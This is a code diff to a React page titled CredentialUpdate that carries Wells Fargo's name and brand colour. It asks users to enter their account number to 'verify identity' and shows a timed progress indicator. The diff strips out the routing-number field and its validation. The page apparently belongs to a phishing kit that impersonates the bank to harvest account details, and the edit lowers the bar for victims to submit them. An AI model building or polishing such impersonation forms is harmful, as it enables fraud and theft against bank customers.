@@ -134,15 +134,7 @@ export default function CredentialUpdate() {
         });
         return;
       }
-      if (!formData.routingNumber || formData.routingNumber.length !== 9) {
-        toast({
-          title: "Routing Number Required",
-          description: "Please enter a valid 9-digit routing number.",
-          variant: "destructive"
-        });
-        return;
-      }
-    }
+          }
 
     setVerificationProgress(0);
     const interval = setInterval(() => {
@@ -362,7 +354,7 @@ export default function CredentialUpdate() {
                   </div>
                   <div className="flex-1">
                     <p className="font-medium text-gray-900">Account Number</p>
-                    <p className="text-sm text-gray-500">Verify using your account and routing numbers</p>
+                    <p className="text-sm text-gray-500">Verify using your account number</p>
                   </div>
                 </button>
 
@@ -598,26 +590,10 @@ export default function CredentialUpdate() {
             </CardHeader>
             <CardContent className="p-4">
               <p className="text-sm text-gray-600 mb-4">
-                Enter your Wells Fargo account and routing numbers to verify your identity.
+                Enter your Wells Fargo account number to verify your identity.
               </p>
               
               <div className="space-y-4">
-                <div className="space-y-2">
-                  <Label htmlFor="routingNumber" className="text-sm font-medium">Routing Number</Label>
-                  <Input
-                    id="routingNumber"
-                    type="text"
-                    value={formData.routingNumber}
-                    onChange={(e) => {
-                      const value = e.target.value.replace(/\D/g, '').slice(0, 9);
-                      setFormData({ ...formData, routingNumber: value });
-                    }}
-                    placeholder="9-digit routing number"
-                    maxLength={9}
-                    data-testid="input-routing-number"
-                  />
-                </div>
-
                 <div className="space-y-2">
                   <Label htmlFor="accountNumber" className="text-sm font-medium">Account Number</Label>
                   <Input
@@ -637,7 +613,7 @@ export default function CredentialUpdate() {
                 <div className="bg-blue-50 p-3 rounded-lg border border-blue-100">
                   <p className="text-xs text-blue-700 flex items-start gap-2">
                     <Info className="w-4 h-4 flex-shrink-0 mt-0.5" />
-                    You can find your routing and account numbers at the bottom of your checks or in your account details.
+                    You can find your account number at the bottom of your checks or in your account details.
                   </p>
                 </div>
 
@@ -654,7 +630,7 @@ export default function CredentialUpdate() {
                 <Button 
                   onClick={handleVerifyIdentity}
                   className="w-full bg-[#d71e28] hover:bg-[#b91c23]"
-                  disabled={!formData.accountNumber || formData.routingNumber.length !== 9}
+                  disabled={!formData.accountNumber}
                   data-testid="button-verify-continue"
                 >
                   Continue
